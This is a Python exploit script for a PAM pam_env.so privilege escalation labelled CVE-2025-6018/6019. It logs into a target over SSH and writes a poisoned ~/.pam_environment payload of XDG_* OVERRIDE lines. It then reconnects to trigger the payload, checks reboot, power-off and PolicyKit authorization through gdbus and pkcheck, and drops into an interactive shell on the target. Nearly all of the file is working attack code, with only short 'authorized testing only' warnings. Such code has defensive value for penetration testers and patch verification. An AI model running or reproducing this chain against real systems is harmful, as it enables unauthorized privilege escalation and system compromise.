#!/usr/bin/env python3
"""
CVE-2025-6018/6019 PAM Environment Variable Injection Exploit ..(verbose)..

This exploit demonstrates a local privilege escalation vulnerability in the PAM
(Pluggable Authentication Modules) pam_env.so module. The vulnerability allows
unprivileged users to inject environment variables via ~/.pam_environment,
which can manipulate SystemD session handling to gain elevated privileges.

VULNERABILITY DETAILS:
- CVE IDs: CVE-2025-6018, CVE-2025-6019
- Affected Versions: PAM 1.3.0 through 1.6.0
- Attack Vector: Local privilege escalation via environment poisoning
- Root Cause: Improper validation of user-controlled ~/.pam_environment file
- Impact: Unauthorized privilege escalation, system compromise

TECHNICAL BACKGROUND:
The pam_env.so module reads the ~/.pam_environment file during PAM session
initialization. By crafting specific XDG_* environment variables with OVERRIDE
directives, an attacker can manipulate SystemD's session management logic,
potentially gaining access to privileged PolicyKit actions that should require
authentication.

REFERENCES:
- https://access.redhat.com/security/cve/CVE-2025-6018
- https://bugzilla.redhat.com/show_bug.cgi?id=2372693
- https://bugzilla.suse.com/show_bug.cgi?id=1243226
- https://github.com/linux-pam/linux-pam

AUTHOR: @İbrahimsql (https://github.com/ibrahmsql)
LICENSE: Use for authorized security testing only
"""

import sys
import time
import socket
import logging
import argparse
from datetime import datetime
from typing import Optional, Tuple, Dict, List

try:
    import paramiko
except ImportError:
    print("ERROR: paramiko library not found")
    print("Install with: pip3 install paramiko>=2.12.0")
    sys.exit(1)

# =============================================================================
# LOGGING CONFIGURATION
# =============================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.FileHandler("cve_2025_6018_exploit.log"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger(__name__)


# =============================================================================
# EXPLOIT CLASS
# =============================================================================


class PAMEnvironmentExploit:
    """
    Exploit class for CVE-2025-6018/6019 PAM environment injection vulnerability.

    This class implements the complete exploit chain:
    1. Vulnerability detection and version checking
    2. Malicious ~/.pam_environment file creation
    3. Session reconnection to trigger PAM processing
    4. Privilege escalation verification
    5. Interactive shell access with elevated privileges

    Attributes:
        VULNERABLE_VERSIONS: List of PAM versions affected by this CVE
        EXPLOIT_PAYLOAD: Environment variable injection payload
        PRIVESC_TESTS: Dictionary of privilege escalation verification tests
    """

    # Known vulnerable PAM versions
    VULNERABLE_VERSIONS = [
        "pam-1.3.0",
        "pam-1.3.1",
        "pam-1.4.0",
        "pam-1.5.0",
        "pam-1.5.1",
        "pam-1.5.2",
        "pam-1.5.3",
        "pam-1.6.0",
    ]

    # Malicious environment variables that poison SystemD session handling
    # The OVERRIDE directive forces PAM to set these values
    EXPLOIT_PAYLOAD = """# CVE-2025-6018/6019 Environment Poisoning Payload
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
XDG_SESSION_TYPE OVERRIDE=x11
XDG_SESSION_CLASS OVERRIDE=user
XDG_RUNTIME_DIR OVERRIDE=/tmp/runtime
SYSTEMD_LOG_LEVEL OVERRIDE=debug"""

    def __init__(self):
        """Initialize the exploit instance."""
        logger.info("PAM Environment Injection Exploit initialized")

    def _execute_command(
        self, client: paramiko.SSHClient, command: str, timeout: int = 10
    ) -> Tuple[str, str]:
        """
        Execute a command via SSH and return stdout/stderr.

        Args:
            client: Active SSH client connection
            command: Shell command to execute
            timeout: Command execution timeout in seconds

        Returns:
            Tuple of (stdout_output, stderr_output) as strings

        Raises:
            paramiko.SSHException: On SSH execution failure
        """
        try:
            stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
            stdout_data = stdout.read().decode().strip()
            stderr_data = stderr.read().decode().strip()
            return stdout_data, stderr_data
        except Exception as e:
            logger.error(f"Command execution failed: {e}")
            raise

    def check_vulnerability(self, client: paramiko.SSHClient) -> bool:
        """
        Perform comprehensive vulnerability assessment of the target system.

        This method checks for:
        1. Vulnerable PAM version installation
        2. pam_env.so module configuration
        3. pam_systemd.so availability (escalation vector)
        4. SystemD version and configuration

        Args:
            client: Active SSH client connection

        Returns:
            True if system appears vulnerable, False otherwise
        """
        logger.info("=" * 70)
        logger.info("STARTING VULNERABILITY ASSESSMENT")
        logger.info("=" * 70)

        # Define vulnerability checks
        # Each check consists of: (name, command, description)
        vulnerability_checks: Dict[str, Tuple[str, str]] = {
            "pam_version": (
                "rpm -q pam 2>/dev/null || dpkg -l 2>/dev/null | grep libpam",
                "Checking installed PAM version",
            ),
            "pam_env_config": (
                "find /etc/pam.d/ -type f -exec grep -l 'pam_env' {} \\; 2>/dev/null",
                "Searching for pam_env.so configuration",
            ),
            "pam_systemd_config": (
                "find /etc/pam.d/ -type f -exec grep -l 'pam_systemd' {} \\; 2>/dev/null",
                "Searching for pam_systemd.so (escalation vector)",
            ),
            "systemd_version": (
                "systemctl --version 2>/dev/null | head -1",
                "Checking SystemD version",
            ),
        }

        is_vulnerable = False
        vulnerability_indicators = []

        # Execute each vulnerability check
        for check_name, (command, description) in vulnerability_checks.items():
            logger.info(f"[CHECK] {description}")

            try:
                output, error = self._execute_command(client, command)

                # Analyze check results
                if check_name == "pam_version":
                    # Check if any vulnerable version is installed
                    for vuln_version in self.VULNERABLE_VERSIONS:
                        if vuln_version in output:
                            logger.warning(
                                f"[VULN] Vulnerable PAM version detected: {vuln_version}"
                            )
                            is_vulnerable = True
                            vulnerability_indicators.append(
                                f"Vulnerable PAM: {vuln_version}"
                            )
                            break
                    else:
                        logger.info(f"[INFO] PAM version info: {output[:100]}")

                elif check_name == "pam_env_config":
                    if output:
                        logger.warning(
                            "[VULN] pam_env.so module is configured and active"
                        )
                        is_vulnerable = True
                        vulnerability_indicators.append("pam_env.so enabled")
                        logger.debug(f"[DEBUG] Config files: {output}")

                elif check_name == "pam_systemd_config":
                    if output:
                        logger.warning(
                            "[VULN] pam_systemd.so found - privilege escalation vector available"
                        )
                        vulnerability_indicators.append("pam_systemd.so present")
                        logger.debug(f"[DEBUG] SystemD PAM configs: {output}")

                elif check_name == "systemd_version":
                    if output:
                        logger.info(f"[INFO] SystemD: {output}")

                time.sleep(0.5)  # Rate limiting between checks

            except Exception as e:
                logger.error(f"[ERROR] Check '{check_name}' failed: {e}")
                continue

        # Log final vulnerability assessment
        logger.info("=" * 70)
        if is_vulnerable:
            logger.warning("[RESULT] TARGET IS VULNERABLE TO CVE-2025-6018/6019")
            logger.warning(f"[INDICATORS] {', '.join(vulnerability_indicators)}")
        else:
            logger.info("[RESULT] No clear vulnerability indicators found")
        logger.info("=" * 70)

        return is_vulnerable

    def deploy_malicious_environment(self, client: paramiko.SSHClient) -> bool:
        """
        Create the malicious ~/.pam_environment file on the target system.

        This is the core exploitation step. The file contains environment
        variables with OVERRIDE directives that will be processed by pam_env.so
        during the next PAM session initialization, poisoning the SystemD
        session environment.

        Args:
            client: Active SSH client connection

        Returns:
            True if deployment successful, False otherwise
        """
        logger.info("=" * 70)
        logger.info("DEPLOYING MALICIOUS ENVIRONMENT FILE")
        logger.info("=" * 70)

        try:
            # Create the malicious .pam_environment file
            # Using heredoc to avoid shell escaping issues
            deploy_command = f"cat > ~/.pam_environment << 'EOF'\n{self.EXPLOIT_PAYLOAD}\nEOF"

            logger.info("[DEPLOY] Writing payload to ~/.pam_environment")
            logger.debug(f"[PAYLOAD]\n{self.EXPLOIT_PAYLOAD}")

            output, error = self._execute_command(client, deploy_command)

            if error:
                logger.error(f"[ERROR] Deployment stderr: {error}")

            # Verify the file was created correctly
            logger.info("[VERIFY] Checking deployed payload")
            verify_output, verify_error = self._execute_command(
                client, "cat ~/.pam_environment"
            )

            # Check if the payload was written successfully
            if "OVERRIDE" in verify_output and "XDG_SEAT" in verify_output:
                logger.info("[SUCCESS] Malicious environment file deployed successfully")
                logger.debug(f"[CONTENT]\n{verify_output}")
                return True
            else:
                logger.error("[FAILURE] Payload verification failed")
                logger.error(f"[OUTPUT] {verify_output}")
                return False

        except Exception as e:
            logger.error(f"[ERROR] Environment deployment failed: {e}")
            return False

    def verify_privilege_escalation(self, client: paramiko.SSHClient) -> bool:
        """
        Test for successful privilege escalation after environment poisoning.

        This method attempts various privileged operations that should normally
        require authentication. If the environment poisoning was successful,
        these operations may be allowed due to manipulated PolicyKit policies.

        Tests performed:
        1. SystemD reboot capability check
        2. SystemD shutdown capability check
        3. Direct PolicyKit authorization check

        Args:
            client: Active SSH client connection

        Returns:
            True if any privilege escalation is detected, False otherwise
        """
        logger.info("=" * 70)
        logger.info("VERIFYING PRIVILEGE ESCALATION")
        logger.info("=" * 70)

        # Define privilege escalation tests
        # Format: (test_name, command, success_indicator, description)
        escalation_tests: List[Tuple[str, str, str, str]] = [
            (
                "systemd_reboot",
                "gdbus call --system --dest org.freedesktop.login1 "
                "--object-path /org/freedesktop/login1 "
                "--method org.freedesktop.login1.Manager.CanReboot",
                "yes",
                "Testing SystemD reboot authorization",
            ),
            (
                "systemd_shutdown",
                "gdbus call --system --dest org.freedesktop.login1 "
                "--object-path /org/freedesktop/login1 "
                "--method org.freedesktop.login1.Manager.CanPowerOff",
                "yes",
                "Testing SystemD shutdown authorization",
            ),
            (
                "policykit_exec",
                "pkcheck --action-id org.freedesktop.policykit.exec "
                "--process $$ 2>/dev/null || echo 'denied'",
                "authorized",
                "Testing PolicyKit execution privileges",
            ),
        ]

        escalation_detected = False
        successful_escalations = []

        # Execute each privilege escalation test
        for test_name, command, success_indicator, description in escalation_tests:
            logger.info(f"[TEST] {description}")

            try:
                output, error = self._execute_command(client, command)
                output_lower = output.lower()

                # Check if the success indicator is present in the output
                if success_indicator in output_lower:
                    logger.warning(
                        f"[ESCALATION] Privilege escalation detected: {test_name}"
                    )
                    logger.warning(f"[OUTPUT] {output}")
                    escalation_detected = True
                    successful_escalations.append(test_name)
                else:
                    logger.info(f"[RESULT] No escalation via {test_name}")
                    logger.debug(f"[OUTPUT] {output}")

            except Exception as e:
                logger.warning(f"[ERROR] Test '{test_name}' failed: {e}")
                continue

        # Log final escalation results
        logger.info("=" * 70)
        if escalation_detected:
            logger.warning("[CONFIRMED] PRIVILEGE ESCALATION SUCCESSFUL")
            logger.warning(f"[VECTORS] {', '.join(successful_escalations)}")
        else:
            logger.info("[RESULT] No clear privilege escalation detected")
            logger.info(
                "[NOTE] Manual verification may be required - "
                "check PolicyKit policies and SystemD session properties"
            )
        logger.info("=" * 70)

        return escalation_detected

    def spawn_interactive_shell(self, client: paramiko.SSHClient) -> None:
        """
        Spawn an interactive shell session with the exploited privileges.

        This provides an interactive command interface where the attacker can
        manually explore the compromised system and execute privileged commands.

        Special commands:
        - 'exit': Close the shell and disconnect
        - 'status': Display current user privileges and group memberships

        Args:
            client: Active SSH client connection
        """
        logger.info("=" * 70)
        logger.info("SPAWNING INTERACTIVE SHELL SESSION")
        logger.info("=" * 70)

        try:
            # Create an interactive shell channel
            shell = client.invoke_shell()

            # Set a custom prompt for clarity
            shell.send("export PS1='exploit# '\n")
            time.sleep(1)

            # Clear the initial connection buffer
            while shell.recv_ready():
                shell.recv(1024)

            # Display shell instructions
            print("\n" + "=" * 70)
            print("INTERACTIVE SHELL SESSION ACTIVE")
            print("=" * 70)
            print("Commands:")
            print("  - 'exit' or 'quit': Close the shell session")
            print("  - 'status': Display current privilege level")
            print("  - Any other command: Execute on target system")
            print("=" * 70 + "\n")

            # Main shell loop
            while True:
                try:
                    # Read user input
                    command = input("exploit# ").strip()

                    # Handle special commands
                    if command.lower() in ["exit", "quit"]:
                        logger.info("[SHELL] User requested exit")
                        break

                    elif command.lower() == "status":
                        # Display privilege status
                        logger.info("[SHELL] Checking privilege status")
                        status_output, _ = self._execute_command(
                            client, "id && groups && echo '---' && "
                            "loginctl show-session $(loginctl | grep $(whoami) | "
                            "awk '{print $1}' | head -1)"
                        )
                        print(status_output)
                        continue

                    elif not command:
                        # Skip empty commands
                        continue

                    # Execute the command in the interactive shell
                    shell.send(command + "\n")
                    time.sleep(0.5)

                    # Read and display the command output
                    while shell.recv_ready():
                        output = shell.recv(1024).decode("utf-8", errors="ignore")
                        print(output, end="")

                except KeyboardInterrupt:
                    # Handle Ctrl+C gracefully
                    print("\n[!] Use 'exit' command to quit properly")
                    continue

                except Exception as e:
                    logger.error(f"[ERROR] Shell error: {e}")
                    break

            logger.info("[SHELL] Interactive session terminated")

        except Exception as e:
            logger.error(f"[ERROR] Failed to spawn shell: {e}")

    def execute_exploit(
        self,
        hostname: str,
        username: str,
        password: Optional[str] = None,
        key_filename: Optional[str] = None,
        port: int = 22,
    ) -> bool:
        """
        Execute the complete exploit chain against the target system.

        Exploit execution flow:
        1. Establish initial SSH connection
        2. Perform vulnerability assessment
        3. Deploy malicious ~/.pam_environment file
        4. Reconnect to trigger PAM processing
        5. Verify privilege escalation
        6. Spawn interactive shell if successful

        Args:
            hostname: Target system hostname or IP address
            username: SSH username for authentication
            password: SSH password (if using password auth)
            key_filename: Path to SSH private key (if using key auth)
            port: SSH port number (default: 22)

        Returns:
            True if exploitation was successful, False otherwise
        """
        logger.info("=" * 70)
        logger.info("CVE-2025-6018/6019 EXPLOIT EXECUTION STARTED")
        logger.info(f"Target: {hostname}:{port}")
        logger.info(f"User: {username}")
        logger.info(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        logger.info("=" * 70)

        client = None

        try:
            # ================================================================
            # PHASE 1: INITIAL CONNECTION
            # ================================================================
            logger.info("[PHASE 1] Establishing initial SSH connection")

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            client.connect(
                hostname=hostname,
                port=port,
                username=username,
                password=password,
                key_filename=key_filename,
                timeout=10,
            )

            logger.info("[SUCCESS] SSH connection established")

            # ================================================================
            # PHASE 2: VULNERABILITY ASSESSMENT
            # ================================================================
            logger.info("[PHASE 2] Performing vulnerability assessment")

            if not self.check_vulnerability(client):
                logger.error(
                    "[FAILURE] Target does not appear vulnerable to "
                    "CVE-2025-6018/6019"
                )
                logger.info(
                    "[INFO] System may be patched or have different configuration"
                )
                return False

            logger.info("[SUCCESS] Target confirmed vulnerable")

            # ================================================================
            # PHASE 3: PAYLOAD DEPLOYMENT
            # ================================================================
            logger.info("[PHASE 3] Deploying exploitation payload")

            if not self.deploy_malicious_environment(client):
                logger.error("[FAILURE] Could not deploy malicious environment")
                return False

            logger.info("[SUCCESS] Payload deployed successfully")

            # ================================================================
            # PHASE 4: RECONNECTION (Trigger PAM)
            # ================================================================
            logger.info("[PHASE 4] Reconnecting to trigger PAM processing")
            logger.info(
                "[INFO] This reconnection will cause PAM to process "
                "the malicious ~/.pam_environment file"
            )

            client.close()
            time.sleep(2)  # Allow session cleanup

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=hostname,
                port=port,
                username=username,
                password=password,
                key_filename=key_filename,
            )

            logger.info("[SUCCESS] Reconnection successful - PAM processing triggered")

            # ================================================================
            # PHASE 5: PRIVILEGE ESCALATION VERIFICATION
            # ================================================================
            logger.info("[PHASE 5] Verifying privilege escalation")

            if self.verify_privilege_escalation(client):
                logger.info("[SUCCESS] EXPLOITATION CONFIRMED - Privilege escalation achieved")
                logger.info("[NEXT] Spawning interactive shell")

                # Spawn interactive shell
                self.spawn_interactive_shell(client)

            else:
                logger.warning("[WARNING] No clear privilege escalation detected")
                logger.info(
                    "[INFO] The exploit may have partially succeeded - "
                    "manual verification recommended"
                )
                logger.info(
                    "[MANUAL] Check: loginctl show-session <session-id> "
                    "for environment variables"
                )

            return True

        except paramiko.AuthenticationException:
            logger.error("[ERROR] Authentication failed - invalid credentials")
            return False

        except paramiko.SSHException as ssh_err:
            logger.error(f"[ERROR] SSH protocol error: {ssh_err}")
            return False

        except socket.error as net_err:
            logger.error(f"[ERROR] Network connection error: {net_err}")
            return False

        except Exception as e:
            logger.error(f"[ERROR] Unexpected error during exploitation: {e}")
            return False

        finally:
            # Cleanup: close SSH connection
            if client:
                try:
                    client.close()
                    logger.info("[CLEANUP] SSH connection closed")
                except:
                    pass

            logger.info("=" * 70)
            logger.info("EXPLOIT EXECUTION COMPLETED")
            logger.info("=" * 70)


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================


def main():
    """
    Main entry point - handles command line arguments and initiates exploit.
    """

    # Configure argument parser with detailed help
    parser = argparse.ArgumentParser(
        description="CVE-2025-6018/6019 PAM Environment Injection Exploit\n\n"
        "This tool exploits a privilege escalation vulnerability in PAM "
        "pam_env.so module\n"
        "by injecting malicious environment variables that manipulate "
        "SystemD session handling.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
USAGE EXAMPLES:
  
  Basic password authentication:
    python3 %(prog)s -i 192.168.1.100 -u testuser -p SecretPass123
  
  SSH key authentication:
    python3 %(prog)s -i target.example.com -u admin -k ~/.ssh/id_rsa
  
  Custom port with verbose logging:
    python3 %(prog)s -i 10.0.0.50 -u user -p pass --port 2222 -v

LEGAL WARNING:
  This tool is for authorized security testing only. Unauthorized access to
  computer systems is illegal. Use only on systems you own or have explicit
  permission to test.
        """,
    )

    # Define command line arguments
    parser.add_argument(
        "-i",
        "--hostname",
        required=True,
        help="Target hostname or IP address",
        metavar="HOST",
    )

    parser.add_argument(
        "-u", "--username", required=True, help="SSH username", metavar="USER"
    )

    parser.add_argument(
        "-p", "--password", help="SSH password (for password auth)", metavar="PASS"
    )

    parser.add_argument(
        "-k",
        "--key",
        dest="key_filename",
        help="Path to SSH private key file (for key auth)",
        metavar="KEYFILE",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=22,
        help="SSH port number (default: 22)",
        metavar="PORT",
    )

    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose/debug logging output",
    )

    # Parse arguments
    args = parser.parse_args()

    # Configure verbose logging if requested
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        logger.debug("[DEBUG] Verbose logging enabled")

    # Validate authentication method
    if not args.password and not args.key_filename:
        parser.error(
            "Authentication required: provide either password (-p) or "
            "private key (-k)"
        )

    # Display legal warning
    print("\n" + "=" * 70)
    print("CVE-2025-6018/6019 PAM ENVIRONMENT INJECTION EXPLOIT")
    print("=" * 70)
    print("WARNING: This tool performs security testing that may be illegal")
    print("         without proper authorization. Use only on systems you")
    print("         own or have explicit written permission to test.")
    print("=" * 70)
    input("Press ENTER to acknowledge and continue...")
    print()

    # Initialize and execute exploit
    exploit = PAMEnvironmentExploit()
    success = exploit.execute_exploit(
        hostname=args.hostname,
        username=args.username,
        password=args.password,
        key_filename=args.key_filename,
        port=args.port,
    )

    # Exit with appropriate status code
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
